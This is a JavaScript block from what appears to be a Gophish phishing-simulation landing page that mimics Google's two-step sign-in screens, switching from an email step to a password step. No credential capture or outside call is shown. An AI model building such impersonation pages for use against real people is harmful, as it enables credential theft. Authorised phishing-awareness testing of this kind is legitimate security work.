    <script>
        // Gophish Logic for Two-Step Sign-In Simulation
        const emailStep = document.getElementById('email_step');
        const passwordStep = document.getElementById('password_step');
        const usernameInput = document.getElementById('username_input');
        const passwordInput = document.getElementById('password_input');
        const nextButtonEmail = document.getElementById('next_button_email');
        const backButtonPw = document.getElementById('back_button_pw');
        // UPDATED: New elements for the email chip
        const userDisplayChipContainer = document.getElementById('user_display_chip_container');
        const userDisplayEmail = document.getElementById('user_display_email');
        // END UPDATED
        const signinHeading = document.getElementById('signin_heading');
        const statement = document.getElementById('statement');

        // Handle Email Input Step (Clicking 'Next')
        nextButtonEmail.addEventListener('click', (e) => {
            // Prevent the button from submitting the form prematurely
            e.preventDefault(); 
            const username = usernameInput.value.trim();

            if (username.length > 0 && username.includes('@')) {
                // 1. Hide Email step
                emailStep.classList.add('hidden');
                
                // 2. Show Password step
                passwordStep.classList.remove('hidden');
                
                // 3. Update headers and show email chip
                signinHeading.textContent = 'Welcome';
                statement.classList.add('hidden'); // Hide the "Use your Google Account" statement
                
                userDisplayEmail.textContent = username;
                userDisplayChipContainer.classList.remove('hidden'); // Show the email chip container

                // 4. Focus on password field
                passwordInput.focus();
            } else {
                // In a real Google page, this shows a subtle red warning, but we'll use a message box for simple feedback.
                // NOTE: Using a custom modal/error UI is better than alert(), but using console.error here.
                console.error('Please enter a valid email address.'); 
                // You can add logic here to display a red border around the input.
            }
        });

        backButtonPw.addEventListener('click', (e) => {
            e.preventDefault();
            
            passwordStep.classList.add('hidden');
            
           
            emailStep.classList.remove('hidden');
            
        
            signinHeading.textContent = 'Sign in to Google'; // Reset heading
            statement.classList.remove('hidden'); // Show statement
            statement.textContent = 'Use your Google Account'; // Reset statement
            userDisplayChipContainer.classList.add('hidden'); // Hide the email chip
            
         
            passwordInput.value = '';
            usernameInput.focus();
        });

        
        document.getElementById('Create_button').addEventListener('click', (e) => e.preventDefault());
        document.getElementById('forgot').addEventListener('click', (e) => e.preventDefault());
        
        // Note: The original file had a #forgot_pw event listener, but you don't have a button with that ID. 
        // It's safer to use the one with the `id="forgot"` and just update the button's text/position.
        // For simplicity and assuming you kept the ID `forgot` for the password step button:
        const forgotButtons = document.querySelectorAll('#forgot, #forgot_pw');
        forgotButtons.forEach(button => button.addEventListener('click', (e) => e.preventDefault()));
    </script>

